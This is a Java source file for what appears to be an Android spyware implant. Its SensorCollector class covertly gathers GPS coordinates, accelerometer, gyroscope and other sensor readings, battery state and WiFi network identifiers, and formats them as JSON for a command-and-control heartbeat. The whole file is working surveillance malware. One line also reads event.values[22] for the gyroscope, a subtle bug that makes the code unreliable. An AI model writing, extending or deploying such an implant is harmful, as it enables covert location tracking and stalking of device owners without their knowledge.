// ============================================================
// FILE: payload/module/src/main/java/io/hackerai/implant/sensors/SensorCollector.java
// ============================================================
package io.hackerai.implant.sensors;

import android.content.Context;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

/**
 * SensorCollector — harvests device sensor data and GPS location.
 *
 * Collects:
 *   - GPS / network location (lat, lon, alt, accuracy, speed, bearing)
 *   - Accelerometer (x, y, z)
 *   - Gyroscope (x, y, z)
 *   - Magnetometer (x, y, z) — compass heading
 *   - Light sensor (lux)
 *   - Pressure (hPa)
 *   - Proximity (cm)
 *   - Battery level / temperature
 *   - WiFi SSID / BSSID (if available)
 *
 * Returns data as JSON for easy transmission over C2.
 */
public class SensorCollector implements SensorEventListener, LocationListener {
    private static final String TAG = "SensorCollector";

    private final Context ctx;
    private final SensorManager sensorManager;
    private final LocationManager locationManager;

    private final AtomicBoolean running = new AtomicBoolean(false);
    private final AtomicBoolean gpsEnabled = new AtomicBoolean(false);

    // Latest readings
    private final AtomicReference<JSONObject> lastSensorData =
            new AtomicReference<>(new JSONObject());

    // Lists of registered sensors for cleanup
    private final List<Sensor> activeSensors = new ArrayList<>();

    // GPS location
    private Location lastLocation;

    public SensorCollector(Context context) {
        this.ctx = context.getApplicationContext();
        this.sensorManager =
                (SensorManager) ctx.getSystemService(Context.SENSOR_SERVICE);
        this.locationManager =
                (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
    }

    /** Start all sensor listeners. */
    public void start() {
        if (running.compareAndSet(false, true)) {
            registerAllSensors();
            startGps();
            Log.i(TAG, "SensorCollector started.");
        }
    }

    /** Stop all sensor listeners. */
    public void stop() {
        if (running.compareAndSet(true, false)) {
            for (Sensor s : activeSensors) {
                sensorManager.unregisterListener(this, s);
            }
            activeSensors.clear();
            stopGps();
            Log.i(TAG, "SensorCollector stopped.");
        }
    }

    /** Register all available sensors. */
    private void registerAllSensors() {
        registerSensor(Sensor.TYPE_ACCELEROMETER, SensorManager.SENSOR_DELAY_NORMAL);
        registerSensor(Sensor.TYPE_GYROSCOPE, SensorManager.SENSOR_DELAY_NORMAL);
        registerSensor(Sensor.TYPE_MAGNETIC_FIELD, SensorManager.SENSOR_DELAY_NORMAL);
        registerSensor(Sensor.TYPE_LIGHT, SensorManager.SENSOR_DELAY_UI);
        registerSensor(Sensor.TYPE_PRESSURE, SensorManager.SENSOR_DELAY_UI);
        registerSensor(Sensor.TYPE_PROXIMITY, SensorManager.SENSOR_DELAY_UI);
        registerSensor(Sensor.TYPE_AMBIENT_TEMPERATURE, SensorManager.SENSOR_DELAY_UI);
        registerSensor(Sensor.TYPE_RELATIVE_HUMIDITY, SensorManager.SENSOR_DELAY_UI);
        // Android 13+ step counter
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerSensor(Sensor.TYPE_STEP_COUNTER, SensorManager.SENSOR_DELAY_UI);
        }
    }

    private void registerSensor(int type, int rate) {
        Sensor s = sensorManager.getDefaultSensor(type);
        if (s != null) {
            sensorManager.registerListener(this, s, rate);
            activeSensors.add(s);
            Log.d(TAG, "Registered sensor: " + s.getName() + " (" + type + ")");
        }
    }

    private void startGps() {
        try {
            Criteria criteria = new Criteria();
            criteria.setAccuracy(Criteria.ACCURACY_FINE);
            criteria.setPowerRequirement(Criteria.POWER_LOW);

            String provider = locationManager.getBestProvider(criteria, true);
            if (provider == null) {
                provider = LocationManager.NETWORK_PROVIDER;
            }

            if (provider != null) {
                locationManager.requestLocationUpdates(
                        provider, 5000L, 10f, this);
                gpsEnabled.set(true);
                Log.d(TAG, "GPS started with provider: " + provider);
            } else {
                Log.w(TAG, "No location provider available.");
            }
        } catch (SecurityException e) {
            Log.w(TAG, "GPS permission not granted.");
        } catch (Exception e) {
            Log.e(TAG, "GPS start failed", e);
        }
    }

    private void stopGps() {
        try {
            locationManager.removeUpdates(this);
            gpsEnabled.set(false);
        } catch (Exception e) {
            Log.e(TAG, "GPS stop error", e);
        }
    }

    // ==============================================================
    // SensorEventListener
    // ==============================================================

    @Override
    public void onSensorChanged(SensorEvent event) {
        try {
            JSONObject data = lastSensorData.get();
            if (data == null) {
                data = new JSONObject();
            }

            switch (event.sensor.getType()) {
                case Sensor.TYPE_ACCELEROMETER:
                    data.put("accel_x", event.values[0]);
                    data.put("accel_y", event.values[1]);
                    data.put("accel_z", event.values[2]);
                    break;
                case Sensor.TYPE_GYROSCOPE:
                    data.put("gyro_x", event.values[0]);
                    data.put("gyro_y", event.values[1]);
                    data.put("gyro_z", event.values[22]);
                    break;
                case Sensor.TYPE_MAGNETIC_FIELD:
                    data.put("mag_x", event.values[0]);
                    data.put("mag_y", event.values[1]);
                    data.put("mag_z", event.values[2]);
                    break;
                case Sensor.TYPE_LIGHT:
                    data.put("light_lux", event.values[0]);
                    break;
                case Sensor.TYPE_PRESSURE:
                    data.put("pressure_hpa", event.values[0]);
                    break;
                case Sensor.TYPE_PROXIMITY:
                    data.put("proximity_cm", event.values[0]);
                    break;
                case Sensor.TYPE_AMBIENT_TEMPERATURE:
                    data.put("ambient_temp_c", event.values[0]);
                    break;
                case Sensor.TYPE_RELATIVE_HUMIDITY:
                    data.put("humidity_pct", event.values[0]);
                    break;
                case Sensor.TYPE_STEP_COUNTER:
                    data.put("step_count", (int) event.values[0]);
                    break;
            }

            data.put("sensor_timestamp", System.currentTimeMillis());
            lastSensorData.set(data);

        } catch (Exception e) {
            Log.e(TAG, "onSensorChanged error", e);
        }
    }

    @Override
    public void onAccuracyChanged(Sensor sensor, int accuracy) {
        // Not used
    }

    // ==============================================================
    // LocationListener
    // ==============================================================

    @Override
    public void onLocationChanged(Location location) {
        this.lastLocation = location;
        try {
            JSONObject data = lastSensorData.get();
            if (data == null) data = new JSONObject();

            data.put("gps_lat", location.getLatitude());
            data.put("gps_lon", location.getLongitude());
            data.put("gps_alt", location.getAltitude());
            data.put("gps_accuracy", location.getAccuracy());
            data.put("gps_speed", location.getSpeed());
            data.put("gps_bearing", location.getBearing());
            data.put("gps_provider", location.getProvider());
            data.put("gps_time", location.getTime());
            data.put("sensor_timestamp", System.currentTimeMillis());

            lastSensorData.set(data);
        } catch (Exception e) {
            Log.e(TAG, "onLocationChanged error", e);
        }
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {}
    @Override
    public void onProviderEnabled(String provider) {}
    @Override
    public void onProviderDisabled(String provider) {}

    // ==============================================================
    // Data access
    // ==============================================================

    /** Get all sensor data as a JSON string. */
    public String getDataJson() {
        JSONObject data = lastSensorData.get();
        if (data == null) return "{}";

        try {
            // Add battery info on each poll
            addBatteryInfo(data);
            // Add WiFi info
            addWifiInfo(data);
            return data.toString();
        } catch (Exception e) {
            return "{}";
        }
    }

    /** Get a compact sensor snapshot for C2 heartbeat. */
    public JSONObject getSnapshot() {
        JSONObject data = lastSensorData.get();
        if (data == null) data = new JSONObject();
        try {
            addBatteryInfo(data);
            if (lastLocation != null) {
                data.put("lat", lastLocation.getLatitude());
                data.put("lon", lastLocation.getLongitude());
            }
        } catch (Exception e) { /* ignore */ }
        return data;
    }

    private void addBatteryInfo(JSONObject data) {
        try {
            android.content.IntentFilter ifilter =
                    new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
            android.content.Intent batteryStatus =
                    ctx.registerReceiver(null, ifilter);

            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(
                        android.os.BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(
                        android.os.BatteryManager.EXTRA_SCALE, -1);
                int temp = batteryStatus.getIntExtra(
                        android.os.BatteryManager.EXTRA_TEMPERATURE, -1) / 10;

                int status = batteryStatus.getIntExtra(
                        android.os.BatteryManager.EXTRA_STATUS, -1);
                boolean charging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING
                        || status == android.os.BatteryManager.BATTERY_STATUS_FULL;

                if (level >= 0 && scale > 0) {
                    data.put("battery_pct", (int) ((level / (float) scale) * 100));
                }
                data.put("battery_temp_c", temp);
                data.put("battery_charging", charging);
            }
        } catch (Exception e) {
            Log.e(TAG, "Battery info error", e);
        }
    }

    private void addWifiInfo(JSONObject data) {
        try {
            android.net.wifi.WifiManager wifi =
                    (android.net.wifi.WifiManager) ctx.getSystemService(
                            Context.WIFI_SERVICE);
            if (wifi != null) {
                android.net.wifi.WifiInfo info = wifi.getConnectionInfo();
                if (info != null) {
                    data.put("wifi_ssid", info.getSSID());
                    data.put("wifi_bssid", info.getBSSID());
                    data.put("wifi_rssi", info.getRssi());
                }
            }
        } catch (Exception e) {
            // Ignore — may not have permission
        }
    }

    public boolean isRunning() { return running.get(); }
    public boolean hasGps() { return gpsEnabled.get(); }
              }
